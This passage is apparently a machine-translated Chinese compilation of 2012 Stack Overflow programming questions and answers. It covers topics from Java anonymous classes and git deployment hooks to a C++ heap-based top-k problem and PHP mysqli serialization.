   public ActionListener WHATISTHIS = new ActionListener () {
      public void actionPerformed (ActionEvent event) {
         String action = event.getActionCommand ();
         show_error ("Key unimplemented: " + action + ": "
                    + keys.valueOf (action).get_html ());
         refresh (action);
      }
   };
   ... 
```

什么是 ActionListener 类型的对象？和对象的新代码之后的东西 {..}？我很困惑。通常我会看到类似的东西：

```
[MODIFIER] [TYPE] obj = new [TYPE](); 
```

但在上述情况下，它是：

```
[MODIFIER] [TYPE] obj = new [TYPE](){...}; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T08:51:32.300

这种类型的类称为[**匿名类**](http://docstore.mik.ua/orelly/java-ent/jnut/ch03_12.htm)。

它声明并实例化一个实现`ActionListener`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T08:51:44.330

```
public ActionListener WHATISTHIS = new ActionListener () 
```

是java中的[匿名内部类](http://docs.oracle.com/javase/tutorial/java/javaOO/innerclasses.html)。它正在实例化一个实现`ActionListener`. 匿名内部类没有任何名称。请在[这里查看](http://docs.oracle.com/javase/tutorial/java/javaOO/innerclasses.html)

# http - 为什么HTTP协议基于TCP？

> ID：13217248
> 
> 赞同：-4
> 
> 时间：2012-11-04T08:49:16.667
> 
> 标签：http, networking, tcp, udp, protocols

为什么人们做了基于 TCP 的 HTTP 协议，而不是基于 UDP？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T08:55:48.070

TCP 保证数据的可靠传输，而 UDP 则不能。这意味着如果他们要在 UDP 上实现 HTTP，他们将不得不在应用层添加可靠的传输机制（例如错误检查），而这完全是不必要的。在浏览网页时，人们更喜欢可靠性而不是性能。

# c# - web.config文件的编译

> ID：13217251
> 
> 赞同：2
> 
> 时间：2012-11-04T08:51:14.347
> 
> 标签：c#, asp.net, parsing, compilation, xml-parsing

我正在阅读**Wrox**出版的《**专业asp.net 2.0 》一书，在****asp.net编译**的概念下，第3章，第3页。98，他们写了以下几行：

 ****> 编译过程不会编译所有类型的 Web 文件。事实上，它只编译特定于 ASP.NET 的文件类型，并在编译过程中排除以下类型的文件：
> - HTML 文件
> - XML 文件
> - XSD 文件
> - web.config 文件
> - 文本文件

那么我的问题是，上面几行的含义是什么？

*   真的不需要编译`web.config`文件吗？
*   如果需要哪个编译器编译这些文件（指的是c#编译器编译的.cs文件，aspnet_compiler编译的.aspx文件这样的）
*   如果它没有编译，那么当我们在`web.config`文件中犯一些错误时它是如何产生编译错误的？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-04T08:55:15.720

web.config 是一个配置文件，不能编译，它只是在部署时复制到网站。

该文件在 Web 应用程序启动时被解析。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T10:15:39.997

“•真的不需要编译web.config文件吗？”

Web.config 在一定程度上取决于托管服务器的设置和配置方式，例如 wcf 设置、安全性、框架、调试等。

因此，编译器可以“编译”web.config 的唯一方法是针对服务器进行编译。

这意味着您将永远无法在无需重新编译的情况下对网站进行基本更改。

只是为了补充一点。web.configs 虽然没有在客户端编译，但是！当检测到更改时，服务器端会在运行时检查它们。因此，如果您犯了错误，您确实会得到一些反馈，尽管到那时您已经发表并且有点晚了。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T08:56:37.803

以上所有文件都不是可编译文件。它们是运行时可能需要的文件，因此应该与您的项目输出一起部署。

特别是，web.config 是包含网站配置的文件，它由 ASP.NET 运行时加载和解释（可能来自您自己的编译文件）

HTML 文件用于表示您网站的内容，XML 文件可以用作某种信息的数据存储，并且可以嵌入到您的编译文件中或您的可执行文件需要。TXT 文件，嗯，它们是简单的、人类可读的文件。****

# php - 使用 git 钩子在多台服务器上自动化 php 部署

> ID：13217258
> 
> 赞同：6
> 
> 时间：2012-11-04T08:52:47.880
> 
> 标签：php, git, deployment, automation

最近我们开始探索 GIT，目标是让我们的开发人员能够在任何地方工作，其次是自动化整个部署过程。

我们有一个中央测试服务器，我们托管所有应用程序/站点以进行测试和/或演示目的，一旦开发和测试完成，我们将应用程序移动到各自的实时服务器。

无论我用 GIT 设置什么，如下
1\. 在测试服务器上创建一个裸仓库
2\. 为每个涉及的开发人员获取一个本地克隆，开发人员将推送到远程（测试服务器）开发分支
3\. 有人将合并所有更改dev 分支到 master 分支并将其推送到远程
4\. 测试服务器（裸仓库）有一个 post-receive 挂钩，它将 master 分支签出到 public_html 文件夹（使用 GIT_WORKING_DIR 和 checkout -f）。

到目前为止，一切正常，我可以在托管页面上的主分支上看到合并（当然是在测试服务器上）。现在我的问题是……
1\. 我这样做对吗？
2\. 我猜我设置的 post-receive 钩子也会在推送到 dev 分支时执行。如何避免这种情况？
3\. 如何将这些内容发送到我的实时服务器？由于我有一些具有大型代码库的项目，因此检查测试服务器上的所有内容然后将其发布到现场看起来还不够好。

我听说过 CI 服务器，但据我所知，他们在本地签出并使用“rsync”（不知道它是否只是同步更改或上传所有内容）或此类工具上传所有内容**。**如果出现任何问题，我只是想避免**一切都**成为一部分，并保持一个选项可以回滚。我擅长在实时服务器上设置 git。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-04T10:18:09.127

1.  是的。[您可以在“ reset hard on git push](https://stackoverflow.com/a/5534486/6309) ”中查看其他注意事项。
2.  您可以在收到提交时测试分支的名称。
    `branch=$(git rev-parse --symbolic --abbrev-ref $refname)` 另请参阅“[编写 git post-receive 挂钩来处理特定分支](https://stackoverflow.com/a/13057643/6309)”
3.  rsync 通常建议用于实时服务器（不需要 git）：它只会更新已更改的内容。
    如果您在实时服务器上有 git，那么“[用于网站的 Git/接收后/测试和生产站点的分离](https://stackoverflow.com/questions/2186411/git-for-websites-post-receive-separation-of-test-and-production-sites)”中描述了各种方法

关于部署，如“[使用 rsync(或 svn、git、cvs) 部署并在部署期间忽略不一致的状态？ ”中所见，在](https://stackoverflow.com/questions/2566099/deploy-with-rsyncor-svn-git-cvs-and-ignore-inconsistent-state-during-deploym)*单独*的目录中部署（甚至所有内容）并将产品实例符号链接到该目录是避免部署期间的不一致，并在出现问题时促进回滚（符号链接回以前的活动目录）。

# javascript - 如何确保ajax响应是一个对象？

> ID：13217264
> 
> 赞同：1
> 
> 时间：2012-11-04T08:54:00.187
> 
> 标签：javascript, ajax, null, undefined, typeof

所以，我有一个 jQuery ajax 调用，我想确保响应是一个对象。

我的第一个想法是，`if(typeof response === "object")`但有一个问题，如果 ajax 请求什么都不返回（但它被 200 标头击中），`response`那么`null`.

这里的问题是`typeof null === "object"`.

那么我怎么知道响应实际上是一个`{}`对象呢？

我想我能做到`if(typeof response === "object" && response !== null)`

但这似乎真的是多余的......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T08:55:05.137

*（下面是在您编辑之前说“我想我可以做......”。`null`检查不是多余的，因为它为条件添加了新信息。）*

您可以明确排除`null`：

```
if (response !== null && typeof response === "object") 
```

请注意，这对所有对象都是如此，包括数组。

如果你想要的东西只适用于`{}`数组或其他内置对象，你可以这样做：

```
if (Object.prototype.toString.call(response) === "[object Object]") 
```

...因为`Object.prototype.toString`在规范中定义为`"[object Null]"`for `null`、`"[object Array]"`数组、`"[object Date]"`日期等。通过规范未定义的构造函数创建的对象（在您的情况下不太可能，因为您正在处理反序列化的 JSON，尽管如果您使用reviver 功能...) 也将作为`"[object Object]"`. （例如，如果您`function Foo`在代码中创建了一个对象 via `new Foo()`，则上面的代码将返回`"[object Object]"`该对象，而不是 [sadly] `"[object Foo]"`。）

请注意，`Object.prototype.toString.call(response)`它**与**, 不同`response.toString()`，因为`toString`它可能已被`response`其原型链覆盖。所以我们直接使用`toString`from `Object.prototype`，因为我们知道（除非有人做一些*非常愚蠢*的事情，比如修改`Object.prototype`），它会按照规范运行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T10:38:10.347

`I have a jQuery ajax call, and I want to make sure that the response is an object`

这是否意味着您仍然可以使用 jQuery？使用[$.isPlainObject](http://api.jquery.com/jQuery.isPlainObject/)怎么样？

```
if ($.isPlainObject(response)){ /* */ } 
```

# python - 来自系统外壳的 Python 3 os.system 输出？

> ID：13217271
> 
> 赞同：1
> 
> 时间：2012-11-04T08:55:18.027
> 
> 标签：python, python-3.x

如何在 Python 中将参数传递给系统 shell 并将输出作为数组或字符串返回？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T09:31:03.750

`os.system`不是为此而设计的；[`os.popen`](http://docs.python.org/2/library/os.html#os.popen)是。两者都已被[`subprocess`模块](http://docs.python.org/2/library/subprocess.html)淘汰，应该用于编写新代码。要捕获 shell 命令的输出，您将实例化一个`subprocess.Popen`对象并调用`communicate()`以检索其输出。

除了上述之外， Python 2.7 中新增[的实用函数`check_output`](http://docs.python.org/2/library/subprocess.html#subprocess.check_output)是 shell 反引号的插件替换，即您将执行命令传递给它并以字符串形式获取输出：

```
>>> subprocess.check_output(['ls', '-a'])
'.\n..\n' 
```

# xcode - Xcode 4.5 似乎仍然期待@synthesize - 否则无法访问属性

> ID：13217272
> 
> 赞同：2
> 
> 时间：2012-11-04T08:55:28.927
> 
> 标签：xcode, xib, xcode4.5, synthesize

我在全新安装的 Mountain Lion 上使用 Xcode 4.5。编译器是 LLVM4.1，我的项目使用的是 ARC。（我过去曾涉足 Xcode，但有一段时间没有接触过它）。

**我的问题：**

我知道在较新版本的 Xcode 中不再需要包含 @synthesize 指令（果然，当我从 .xib 中的 UI 组件 ctrl-drag 到 .h 文件时，不会在其中创建指令.m 文件），但没有它们我无法访问这些属性，而是得到“未知接收器 xxx”错误。

**简单的例子：**

我创建了一个带有标签 ('myLabel') 和按钮 ('myButton') 的 Single View iPhone 项目。我 ctrl 从 ViewController.xib 中的 UILabel 拖到 ViewController.h 以创建以下属性：

```
@property (strong, nonatomic) IBOutlet UILabel *myLabel; 
```

我也通过拖放创建了按钮*操作。*

在 .m 文件中，我在 myButton 方法中编写了以下代码：

```
- (IBAction)myButton:(id)sender {
  NSLog(@"The label text is %@", [myLabel text]);
} 
```

**结果：**

这给了我一个编译时错误（“未知接收者 myLabel”）。

我仍然可以使用下划线（即 [_myLabel 文本]）或添加“@synthesize myLabel;”来访问我的属性。手动在 .m 文件的顶部，但我认为我不需要这样做，或者应该为我完成。谁能解释我在代码中做错了什么（或者如果这是由于我需要调整的某些设置？）

谢谢

ps 我注意到我的 .m 文件现在在顶部也有自己的 @interface 块（大概是为了声明私有变量？）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T09:01:15.887

自动 ivars 带有下划线前缀，以将它们与属性名称区分开来。所以你需要使用`_myLabel`. 如果您不喜欢默认前缀，可以使用更改属性的 ivar 名称`@synthesize`

# razor - 在 Umbraco 中访问/显示链接文档类型的属性

> ID：13217274
> 
> 赞同：1
> 
> 时间：2012-11-04T08:55:47.120
> 
> 标签：razor, umbraco

我对 Umbraco 比较陌生，但使用一个有点做作的宠物项目，我在陡峭的倾斜曲线上取得了良好的进展。

我的宠物项目是一个“简单”的杂志数据库，它将存储我每月订阅的详细信息，包括其中的文章。希望（完成后）我能够搜索数据库来确定特定文章所在的问题，而不是手动浏览它们。

我遇到的问题是我想包含封面光盘的详细信息，并在杂志的详细信息页面上显示摘要信息。我为封面光盘创建了一个文档类型，并向通过内容选择器设置的杂志文档类型添加了一个“coverDisc”属性。杂志的创建/编辑一切顺利，我可以关联我已经创建的封面光盘。

但是，当我来到模板时，这就是我遇到问题的地方 - 如何从我可用的 @Model 访问封面光盘？我在 Google 上搜索了很长时间，但似乎只找到了解决模糊相似问题的 XSLT 解决方案。

我正在使用当前版本的 Umbraco (4.9.1)，目前我在 Umbraco 环境中工作，而不是 Visual Studio（尽管这最终是我想要结束的地方）。

任何指点都感激不尽。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T15:22:37.597

查看我对[这个问题](https://stackoverflow.com/questions/11116644/umbraco-razor-getting-fields-from-content/11119812#11119812)的回答，了解您的问题的答案以及一些学习 Umbraco 剃须刀的好资源。

基本上，您将执行以下操作：

```
dynamic node = Library.NodeById(Model.coverDisc); 
```

...访问链接的封面光盘节点，然后以与模型相同的方式访问属性：

```
@node.Name 
```

# java - 拒绝所有其他进程访问文件？

> ID：13217277
> 
> 赞同：2
> 
> 时间：2012-11-04T08:56:16.403
> 
> 标签：java, file, java-io

我正在编写一个应用程序（用于教育目的），它需要使用数据库管理系统（我自己编写了极其原始的 DBMS，这是任务的一部分）。而且我想确保在我的应用程序运行的任何时候，所有表的内容都是正确的。为此，我编写了方法，它查看每个文件并进行必要的检查。问题是我只想在应用程序启动并拒绝访问文件时调用此方法一次，以确保在我的程序运行时没有人更改其内容。

我使用以下方法。当应用程序启动时，我初始化**InputStreamReader**和**OutputStreamWriter**，存储它们并仅在我的应用程序终止时关闭它们。

**部分初始化方法：**

```
FileInputStream fis = new FileInputStream(file);
FileOutputStream fos = new FileOutputStream(file, true); 
InputStreamReader isr = new InputStreamReader(fis, "UTF-8");
OutputStreamWriter osw = new OutputStreamWriter(fos, "UTF-8");

this.tables.get(table).put("fis", fis);
this.tables.get(table).put("fos", fos);
this.tables.get(table).put("isr", isr);
this.tables.get(table).put("osw", osw); 
```

**关闭方法：**

```
try {
    for(Map<String, Object> table_map: tables.values()) {
        OutputStreamWriter osw = (OutputStreamWriter)table_map.get("osw"); 
        InputStreamReader isr = (InputStreamReader)table_map.get("isr"); 

        if (osw != null)
            osw.close();
        if (isr != null)
            isr.close();
    }
}
catch (IOException e) {
    throw new DBException("Closing error");
} 
```

部分地，这种方法有效，因为当我尝试使用 MS 记事本修改这些文件中的任何一个时，我收到以下错误

> “该进程无法访问该文件，因为它正被另一个进程使用”

这就是我想看到的。但是如果我使用 Notepad++，我可以在我的应用程序运行时进行任何修改，这不是我期望看到的。那么我能做些什么来确保没有其他进程可以修改我的文件呢？

我尝试使用**FileLock**，但如果我没记错的话，它只会拒绝我的进程的访问。

对不起我的英语不好，希望你能理解我的问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T09:02:33.297

我不确定这是一个值得解决的问题。无论您采取何种方法，具有正确权限的人都可能会撤消您的文件保护，并且无论如何都可以进行更改。

最好专注于优雅地处理无效数据，否则信任文件中的内容。添加某种完整性检查（每行或表）将使某人更难意外或恶意更改您的数据，使其看起来“有效”。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T09:40:09.000

如果您阅读文档中的“平台依赖项”部分，您`java.nio.channels.FileLock`会看到：

*   `FileLocks`不是（仅）用于锁定在*一个*JVM 内部，而是用于计算机上的所有进程。
*   文件锁（注意不同的拼写）很大程度上取决于平台和配置。

所以你基本上必须问自己：我*真正*需要什么保护？

如果您只想防止在同一数据上多次运行*您的程序，您可以假设您的程序“表现良好”并且*

*   使用`FileLocks`或
*   使用标记锁定文件或
*   在文件中使用“脏/锁定”标记

如果你想保护*所有其他*程序，那么你就迷失了，就像你在 Notepad++ 场景中看到的那样：考虑所有平台和所有可能的方法来规避锁和使用 Java——你没有机会。

# c - 使用 C 读取文件并删除字符

> ID：13217278
> 
> 赞同：0
> 
> 时间：2012-11-04T08:56:25.187
> 
> 标签：c, trim, readfile

我正在努力读取文件并删除行中的一些字符，我可以以任何方式删除字符，但是 char * 包含很多未知的东西。

这是我的文件里面。只有一条线

```
localpath=/home/ubu/myDocs 
```

在我的代码中

```
#include <stdio.h>
#include <strings.h>

char *path;

int main()
{ 
  static const char filename[] = "pathFile";
  FILE *file = fopen ( filename, "r" );

   if ( file != NULL )
   {
      char line[512];
      while ( fgets ( line, sizeof line, file ) != NULL ) // read a line 
      {
         fputs ( line, stdout ); // write the line 
         path = strchr(line,'=') +1 ;
      }
      fclose ( file );
   }
   else
   {
      perror ( filename ); // why didn't the file open? 
   }
} 
```

但问题是我不能使用路径，例如 chdir(path); 不工作，但如果我像这样使用 strcpy(path,"/home/ubu/myDocs"); 我可以用，

所以我想我像这样打印字符

for (i=0, i < 200; i++) printf(path[i]);

在第一种情况下，我在输出中的 ("/home/ubu/myDocs") 之后得到了一些奇怪的字符，但在第二种情况下，我没有得到那种东西，而且效果很好。我不明白该怎么办，我在互联网上遵循了很多方法，但同样的事情发生了，请解释一下发生了什么并给我一些解决方案

ps 我发现在第一种情况下 chdir 返回值 < 0，这意味着路径是错误的，不，，但它包含路径和一些无用的东西

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T09:17:10.527

你能准确地添加你看到的输出`printf()`吗？

我最好的猜测是这`fgets()`只是包括额外的字符。当您执行 an`fgets()`并传入时`sizeof line`，它将读取最多 512 个字符，但将在换行符`\n`或 EOF（或可能其他字符，如回车符`\r`）之后停止。特别是，如果您的文件中有换行符，它将被复制到`fgets()`. 尝试删除文件路径末尾的任何多余字符。

**编辑**所以你有两个不同的问题。首先是为什么在打印`path`. 嗯……那是因为你打印了 200 个字符。您希望其他约 190 个字符是什么？我不知道为什么你在使用时看不到垃圾，`strcpy()`但你并没有真正展示你做了什么。第二个问题是@WhozCraig 指出的问题。您在该块`line`的末尾超出范围。`if`如果您`chdir()`在那之后调用路径，则`path`指向垃圾。

# ios5 - 如何防止挂起的应用程序被清除内存？

> ID：13217282
> 
> 赞同：0
> 
> 时间：2012-11-04T08:56:39.567
> 
> 标签：ios5, memory-management

在 IOS5 中 - 如果我的应用程序被挂起，如果 IOS 需要内存，我能否以某种方式阻止它从内存中清除？如果它确实被清除了，我可以要求IOS在它再次恢复内存后再次将其置于暂停状态吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T18:20:50.080

不，你不能那样做。内存由看门狗控制。

而是让您的应用程序保留上一个状态以加快下一次启动。然后，对于用户来说，该应用程序似乎从未被杀死。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T09:57:54.033

如果您使用太多内存，Ios 只会杀死您的应用程序......否则它将永远不会被杀死，因此请尽量保持您的内存消耗非常低。而不是分配内存尝试使用 mmap insted

# android - TextViews 不会在 android UI 中更新

> ID：13217283
> 
> 赞同：2
> 
> 时间：2012-11-04T08:56:43.377
> 
> 标签：android, android-layout, android-intent, bluetooth, textview

我们有两个活动，一个是我们通过蓝牙建立连接并管理蓝牙另一个是更新我们想要更新包含 TextViews 的 GUI 的 UI。我们在两个活动中成功发送和接收消息，反之亦然。

```
private OnMessageReceivedListener dataReceivedListener = new OnMessageReceivedListener() {
    public void OnMessageReceived(String device, String message) {
        //t.setText(message);
        Log.d("Message" , message);
        msg = message;
        UpdateGUI();

    }
}; 
```

上面的函数接收到消息，我们成功地做到了。

```
 private void UpdateGUI() {
    //i++;
    //tv.setText(String.valueOf(i));
    myHandler.post(myRunnable);
 }

 final Runnable myRunnable = new Runnable() {
    public void run() {  
    btBoard.UpdateYoursBoard(mystring);

    }
 }; 
```

连接类的上述函数调用我们的GUI类的方法，并发送一个接收到的消息给它。

在我们的 GUI 类中，我们想要这个

```
 public void UpdateYoursBoard(String positions)
{
    Log.d("Positions" , positions);
    tv.setText(positions); 
```

}; 我们成功地收到了 log.d 中的消息，但是当我们想要更改我们的 textview 文本时，它会给出以下错误。

```
 java.lang.NullPointerException
       at net.clc.bt.Board.UpdateYoursBoard(Board.java:3460) 
```

**注意**：我们正在使用蓝牙，我们同时连接了 3 部手机，UpdateYourBoard 将更改 3 部手机 GUI 的 TextViews。

请帮我解决问题。提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T09:00:34.073

首先，您的董事会课程太大了。java 文件中的 3 500 行是非常糟糕的主意。设计更多，解耦和拆分事物。您错过了 IT 的分而治之原则。

在您的情况下， tv 为空。您如何以及何时获得对它的参考？如果您在 onCreate 方法中使用了 findViewById（在调用 super.onCreate 之后），它应该可以工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T09:07:06.780

对您的 TextView 'tv' 的引用为空。`findViewById()`使用或其他适当的方法在某处初始化它。

检查您的范围等，以便在您调用该`setText()`方法的位置正确维护引用。

# c++ - 超过最大堆的时间限制

> ID：13217284
> 
> 赞同：3
> 
> 时间：2012-11-04T08:56:47.870
> 
> 标签：c++

我想设计一个函数来查找具有时间复杂度的 N 个无序元素集合中的 k 个最大元素：`Θ(N+klogN)`在线判断。

这是一个示例：

* * *

输入

```
LN 1 : N K

LN 2 : N numbers 
```

输出

```
LN 1 : K biggest number

LN 2 : Final heap 
```

样本输入

```
10 4
17 19 26 37 30 11 5 29 32 1 
```

样本输出

```
29
26 19 11 17 1 5 
```

* * *

这是我的代码：

```
#include <iostream>

using namespace std;

int main(){

    int i,j,rc,temp,temp1,length,K;
    cin>>length>>K;
    int *heap = new int[length];

    for(i=0;i<length;i++) cin>>heap[i];
    for(i=length/2-1;i>=0;i--){                  //build a max heap first with Θ(N)
        while(!((i>=length/2)&&(i<length))){
            j = 2*i+1;
            rc = 2*i+2;
            if((rc<length)&&(heap[j]<heap[rc])) j=rc;
            if(heap[i]>heap[j]) break;
            temp = heap[i];
            heap[i]=heap[j];
            heap[j]=temp;
            i=j;
        }
    }
    int k,n=length;
    for(k=0;k<K;k++){                         //shiftdown k times to find k biggest 
        temp1=heap[--n];                      //numbers with Θ(klogN)
        heap[n] = heap[0];
        heap[0] = temp1;
        if(n!=0) {
            i=0;
                while(!((i>=n/2)&&(i<n))){
                     j = 2*i+1;
                    rc = 2*i+2;
                    if((rc<n)&&(heap[j]<heap[rc])) j=rc;
                    if(heap[i]>heap[j]) break;
                    temp = heap[i];
                    heap[i]=heap[j];
                    heap[j]=temp;
                    i=j;
                }
            }
        }

    cout<<heap[length-K]<<endl;
    for(i=0;i<length-K;i++)
        cout<<heap[i]<<" ";
    return 0;
} 
```

没关系，但是其中一个数据是 Time Limit Exceed ，我对如何解决这个问题感到很困惑。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T09:53:17.853

您的筛选操作似乎不正确。那里不应该有两个嵌套循环。您应该从根开始并继续与它的一个孩子交换它，直到它比两者都大。外部循环`for(i=n/2-1;i>=0;i--)`不应该存在（它会导致每次筛选`O(n)`） - 我认为您应该设置`i`为 0 以从根开始。

编辑：您的 heapify 操作也太慢了：您`i`对外部和内部循环使用相同的循环变量，因此它会交替变大和变小。内循环应该从外循环的 开始`i`，但不应该影响`i`外循环下一次迭代中的值。我建议将筛选操作放在它自己的功能中。这既可以解决这个问题，又可以避免筛选编码两次。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T09:53:57.977

我猜是一些 onlinejudge.org 比赛。为什么不分享问题链接？

然后我们可能会判断您是否真的需要堆排序，或者您是否会更好地使用诸如 QuickSelect 之类的东西和一个好的启发式方法。

我的猜测是，简单的堆排序*不足以满足*他们的一个测试用例。

您可能还需要添加优化，例如在开头和结尾检查预排序的数据或反向排序的数据（和数据部分）。避免为这些部分构建堆，但保持原样。

**尝试在一个巨大的*反向*排序列表**上运行 heapsort ，k 很大，IIRC 是最坏的情况（对于最大堆，任何最小堆都应该是最坏的情况，反之亦然）。

典型的在线法官测试用例通常是围绕这些已知的最坏情况精心设计的。然后设置时间限制，即使使用非常好的优化`O(n + k log n)`解决方案，与真正的解决方案相比，您也会失败`O(n)`。他们只需要使 k 足够大。他们来自比赛，他们想通过给他们真正的平均输入文件来挑战人们！

PS 你的**堆构建**好像也太复杂了。问题是你又*增加`i`*了。你不应该这样做。通过在 while 循环中增加 i，您会导致自下而上的堆构造再次“重新启动”多次。所以你的堆构建可能不再是`O(n)`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T11:58:29.000

您可能想检查三个不同序列会发生什么：

*   1.  4 2 1 2 3 4
*   1.  4 2 4 3 2 1
*   1.  4 2 1 1 1 1

* * *

```
 int NN=0;
 for(i=length/2-1;i>=0;i--){                  //build a max heap first with Θ(N)
cout << "i=" << i << "\n";
    while(!((i>=length/2)&&(i<length))){
        j = 2*i+1;
        rc = 2*i+2;
        cout << NN++ << " " << j << " " << rc << " " << i << "\n";
        if((rc<length)&&(heap[j]<heap[rc])) j=rc;
        if(heap[i]>heap[j]) break;
        temp = heap[i];
        heap[i]=heap[j];
        heap[j]=temp;
        i=j;
    }
} 
```

在最后一种情况下，循环将稳定到 j=3；rc=4; 我=1；

也许内部循环应该使用单独的变量而不是“i”。

# octopress - 在 octopress 中有模板数据的 site.pages 或 site.projects 吗？

> ID：13217285
> 
> 赞同：1
> 
> 时间：2012-11-04T08:56:49.083
> 
> 标签：octopress

在官方 jekyll 文档：[模板数据](https://github.com/mojombo/jekyll/wiki/Template-Data)中，我们有*site.posts*用于所有帖子的反向时间列表。我们可以为所有页​​面的列表提供*site.pages吗？*或者，如果我们创建一些自定义布局，例如*project*，如何为所有项目创建*site.projects*？

# azure - 在 Azure Web 角色中运行 node.js

> ID：13217293
> 
> 赞同：0
> 
> 时间：2012-11-04T08:58:30.693
> 
> 标签：azure, azure-web-roles

我有一个非常简单的 Nodejs 应用程序，它在端口 6647 上运行。我还有一个在普通端口 80 上运行的 ASP.NET 应用程序。我有一个启动脚本，它在部署云服务时启动 node.exe。它在我的本地计算模拟器上运行得很好。但是，当我部署到云时，角色会重新启动几次，并且端口 6647 似乎没有打开。这是我的配置：

```
<Endpoints>
  <InputEndpoint name="HttpIn" protocol="http" port="80" />
  <InputEndpoint name="NodeHttpIn" protocol="http" port="6647" />
</Endpoints> 
```

我已经使用远程桌面登录到服务器并且节点正在运行，如果我在浏览器中输入

```
http://127.0.0.1:6647 
```

然后我得到了 Node.js 的回复。

这让我相信负载均衡器并没有打开 6647 尽管上面的配置。

任何人都知道为什么我似乎无法在 Azure Web 角色（SDK v1.8，Windows Server 2012）中与 IIS 一起运行 Nodejs？在我的开发 PC 和我的登台服务器（虚拟机）上运行良好。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T10:53:58.480

您是否尝试添加在防火墙中打开端口 6647 的启动任务？这里有一个示例：[将防火墙规则添加到在 Windows Azure 中运行的 VM (CSAzureAddFirewallRules)](http://code.msdn.microsoft.com/windowsazure/CSAzureAddFirewallRules-352de4ed)

# ios - iOS Cocoa - 自定义 uipickerview 或类似

> ID：13217296
> 
> 赞同：2
> 
> 时间：2012-11-04T08:59:37.303
> 
> 标签：ios, cocoa-touch, custom-controls, uipickerview

所以我正在尝试为我正在制作的应用程序创建类似的东西，但我不确定如何去做。我正在考虑使用 ScrollView 自定义 UIPickerView 或其他东西。一个问题是我希望它的尺寸​​很小。我的目标是 85x120px 大小（比我可以得到的 UIPicker 小得多。任何帮助/指向正确的方向将不胜感激。

[例子](http://i.imgur.com/Ttklx.png)

此外，此应用程序将是 iOS 6+，因此任何新控件都可以：)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-13T20:15:05.397

UIPicker 可以改变宽度，但不能直接改变高度。但是有一些方法。

您可以使用 CGAffineTransformScale() 更改高度。

```
CGAffineTransform transform = pickerView.transform;
transform = CGAffineTransformScale(transform, 1, 10);
pickerView.transform = transform; 
```

您可以查看有关 CGAffineTransform 的更多信息，如果您想自定义某些内容，这真的很有帮助。

# java - 在java中将String byte []转换为Raw byte []

> ID：13217297
> 
> 赞同：0
> 
> 时间：2012-11-04T08:59:38.773
> 
> 标签：java, string, bytearray

如果我有一个`byte []`以这种格式保存字符串：

```
abcd 546546545 dfdsfdsfd 5415645 
```

我知道这些数字是整数类型。`byte[]`在不使用方法的情况下，最好的方法是`String.split()`什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T15:27:49.157

该答案基于以下假设（您发布的内容都没有明确保证）：

*   您当前正在直接从文件中读取字节
*   该文件以 VM 的默认编码存储
*   你想忽略所有不是十进制数字的东西
*   您想要生成一个`byte[]`其中每个字节包含与文件中找到的十进制数字相对应的数值

有了这些假设，我将按如下方式解决这个问题：

```
public byte[] getDigitValues(String file) throws IOException {
    FileReader rdr = new FileReader(file);
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    try {
        rdr = new BufferedReader(rdr);
        for (char c = rdr.read(); c != -1; c = rdr.read()) {
            if (c >= '0' && c <= '9') {
                bos.write(c - '0');
            }
        }
    } finally {
        if (rdr != null) {
            try { rdr.close(); }
            catch (IOException e) {
                throw new IOException("Could not close file", e);
            }
        }
    }
    return bos.toByteArray();
} 
```

在 Java 7 中，我会使用[try-with-resources 语句](http://docs.oracle.com/javase/tutorial/essential/exceptions/tryResourceClose.html)：

```
public byte[] getDigitValues(String file) throws IOException {
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    try (Reader rdr = new BufferedReader(new FileReader(file))) {
        for (. . .
    }
    return bos.toByteArray();
} 
```

# php - 序列化然后反序列化 mysql 结果对象

> ID：13217299
> 
> 赞同：2
> 
> 时间：2012-11-04T08:59:57.010
> 
> 标签：php, mysql, serialization

```
class a {
  public function getContinents () {
    // connect to db
    $res = $this->db->query("SELECT continent FROM mytable");
    return $res;
  }
}

$obj = new a();
$getContinents = $obj->getContinents(); 
```

所以如果我们在这里检查变量 getContinents，它是一个有效的 mysqli-result 对象

```
var_dump($getContinents); 
```

结果是

```
object(mysqli_result)#4 (5) { ["current_field"]=> int(0) ["field_count"]=> int(1) ["lengths"]=> NULL ["num_rows"]=> int(6) ["type"]=> int(0) } 
```

现在我想序列化和反序列化这个对象

```
$getContinents_to_str = serialize($getContinents);
var_dump(unserialize($getContinents_to_str)); 
```

现在结果是

```
Warning: var_dump(): Property access is not allowed yet in ...

object(mysqli_result)#5 (5) { ["current_field"]=> NULL ["field_count"]=> NULL ["lengths"]=> NULL ["num_rows"]=> NULL ["type"]=> NULL } 
```

请告诉我为什么会这样？哪里错了？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-04T09:08:58.850

1.  mysqli 类是在类中构建的，这些类的行为不一定与您自己的类相同。
